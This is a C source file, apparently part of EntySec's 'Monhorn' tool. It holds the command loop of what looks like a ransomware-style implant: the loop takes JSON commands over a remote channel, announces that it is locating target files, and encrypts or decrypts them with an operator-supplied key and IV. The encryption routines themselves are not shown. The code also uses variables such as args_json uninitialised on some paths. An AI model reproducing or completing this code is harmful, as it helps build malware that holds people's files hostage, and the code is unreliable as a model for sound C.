/*
* MIT License
*
* Copyright (c) 2020-2022 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "json.h"
#include "channel.h"
#include "monhorn.h"

void interact(int channel)
{
    while (1) {
        char *path, *key, *iv;

        char *input = read_channel(channel);
        JSONObject *json = parseJSON(input);

        char *cmd = find_json(json, "cmd");
        char *args = find_json(json, "args");
        char *token = find_json(json, "token");

        if (strcmp(cmd, "encrypt") == 0 || strcmp(cmd, "decrypt") == 0) {
            format_json(args);
            JSONObject *args_json = parseJSON(args);

            send_channel(channel, "Locating target files...\n");

            path = find_json(args_json, "path");
            key = find_json(args_json, "key");
            iv = find_json(args_json, "iv");

            send_channel(channel, "Begining crypto operations...\n");
        }

        if (strcmp(cmd, "encrypt") == 0)
            begin_encrypt(channel, path, key, iv);
        else if (strcmp(cmd, "decrypt") == 0)
            begin_decrypt(channel, path, key, iv);
        else if (strcmp(cmd, "exit") == 0) {
            send_channel(channel, token);
            break;
        }

        send_channel(channel, token);

        freeJSONFromMemory(json);
        freeJSONFromMemory(args_json);
    }
}
